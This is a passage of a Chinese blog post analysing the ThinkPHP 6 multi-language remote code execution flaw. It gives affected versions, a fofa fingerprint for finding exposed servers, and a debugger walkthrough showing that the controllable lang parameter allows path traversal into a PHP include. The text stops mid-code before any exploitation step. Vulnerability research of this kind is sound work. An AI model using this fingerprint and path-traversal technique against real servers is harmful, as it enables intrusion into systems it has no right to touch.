@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Thinkphp6 多语言RCE" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Thinkphp6 多语言RCE
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="post-toc-text">环境搭建</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tp6%E5%AE%89%E8%A3%85"><span class="post-toc-text">tp6安装</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="post-toc-text">修改配置文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%80%BB%E7%BB%93"><span class="post-toc-text">总结</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>漏洞文章:<a target="_blank" rel="noopener" href="https://tttang.com/archive/1865/">https://tttang.com/archive/1865/</a></p>
+<p>影响范围: Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p>
+<p>fofa指纹: header&#x3D;”think_lang”</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="tp6安装"><a href="#tp6安装" class="headerlink" title="tp6安装"></a>tp6安装</h3><p>我这里是用phpstorm配合ubuntu虚拟机进行远程调试</p>
+<p>安装composer</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https:<span class="comment">//getcomposer.org/installer | php</span></span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br><span class="line">chmod +x /usr/local/bin/composer</span><br></pre></td></tr></table></figure>
+
+<p>用composer安装tp6，需要php版本为7以上，所以要设置一下php版本，否则会报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=6.0.13 tp6.0.13</span><br></pre></td></tr></table></figure>
+
+<p>修改compoer.json来设置tp的版本</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=7.2.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.0.13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/think-orm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>最后执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>需要将多语言功能打开<code>app/middleware.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">     \think\middleware<span class="title class_">\LoadLangPack</span>::<span class="variable language_">class</span>,</span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    <span class="comment">// \think\middleware\SessionInit::class</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251425209.png" title="image-20240125142526010" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251425209.png" alt="image-20240125142526010"></a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先去了解一下thinkphp6的基本路由，控制器，架构，看看手册就行了<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0">ThinkPHP6.0完全开发手册</a></p>
+<p>跟一些代码，找到漏洞点</p>
+<p>进入<code>\think\middleware\LoadLangPack::class</code>，在<code>handle()</code>函数打上断点</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251447699.png" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251447699.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251447003.png" title="image-20240125144755863" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251447003.png" alt="image-20240125144755863"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自动侦测当前语言</span></span><br><span class="line">    <span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">defaultLangSet</span>() != <span class="variable">$langset</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">switchLangSet</span>(<span class="variable">$langset</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">saveToCookie</span>(<span class="variable">$this</span>-&gt;app-&gt;cookie, <span class="variable">$langset</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>middleware</code>里的类都会被调用handle函数，用来处理请求，这是tp6框架决定的。</p>
+<p>开启debug，跟进<code>detect()</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251436320.png" title="image-20240125143627165" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251436320.png" alt="image-20240125143627165"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自动侦测设置获取语言选择</span></span><br><span class="line">    <span class="variable">$langSet</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// url中设置了语言变量</span></span><br><span class="line">        <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;header_var&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// Header中设置了语言变量</span></span><br><span class="line">        <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;header_var&#x27;</span>]));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// Cookie中设置了语言变量</span></span><br><span class="line">        <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>]));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 自动侦测浏览器语言</span></span><br><span class="line">        <span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([a-z\d\-]+)/i&#x27;</span>, <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>), <span class="variable">$matches</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$match</span>) &#123;</span><br><span class="line">            <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$matches</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>])) &#123;</span><br><span class="line">                <span class="variable">$langSet</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>]) || <span class="title function_ invoke__">in_array</span>(<span class="variable">$langSet</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 合法的语言</span></span><br><span class="line">        <span class="variable">$range</span> = <span class="variable">$langSet</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">setLangSet</span>(<span class="variable">$range</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$range</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">getLangSet</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$range</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先用<code>$request-&gt;get()</code>进行取值，<code>$this-&gt;config[&#39;detect_var&#39;]</code>的值为<code>lang</code>，那么就是取get参数lang的值，所以<code>$langSet</code>的值是可控。</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251453313.png" title="image-20240125145302280" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251453313.png" alt="image-20240125145302280"></a>                       </p>
+<p>这里先给lang传参再进行调试，<code>http://192.168.91.39:8085/public/?lang=v2222</code></p>
+<p>后面运行到这里，会进行一下判断</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251455537.png" title="image-20240125145549484" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251455537.png" alt="image-20240125145549484"></a></p>
+<p>是会进入if分支的，从而将Lang类的实例里的成员<code>$lang</code>的值设置为我输入的传参<code>v2222</code>，然后返回<code>$range</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251458051.png" title="image-20240125145819912" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251458051.png" alt="image-20240125145819912"></a></p>
+<p>然后出来函数，继续走到这里，会判断当前<code>$langset</code>的值是否和默认值一样，不一样就进入if分支，很明显看到，我这里是会进入分支的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251458700.png" title="image-20240125145858558" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251458700.png" alt="image-20240125145858558"></a></p>
+<p>跟进<code>$this-&gt;lang-&gt;switchLangSet()</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251501194.png" title="image-20240125150115064" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251501194.png" alt="image-20240125150115064"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">switchLangSet</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$langset</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$langset</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setLangSet</span>(<span class="variable">$langset</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载系统语言包</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载系统语言包</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getAppPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.*&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$files</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载扩展（自定义）语言包</span></span><br><span class="line">    <span class="variable">$list</span> = <span class="variable language_">$this</span>-&gt;app-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;lang.extend_list&#x27;</span>, []);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$list</span>[<span class="variable">$langset</span>])) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$list</span>[<span class="variable">$langset</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会加载系统语言包，这里可以知道，他加载的文件路径是可控的，可以使用目录遍历的方式，加载任意php结尾的文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251502062.png" title="image-20240125150208938" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251502062.png" alt="image-20240125150208938"></a></p>
+<p>跟进<code>load()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$range</span> = <span class="string">&#x27;&#x27;</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$range</span> = <span class="variable">$range</span> ?: <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>])) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lang</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$name</span>);</span><br><span class="line">            <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lang</span>)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = <span class="variable">$lang</span> + <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>$file</code>是文件，则进入<code>parse()</code>函数</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251503491.png" title="image-20240125150334314" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251503491.png" alt="image-20240125150334314"></a></p>
+<p>跟进<code>parse()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">            <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        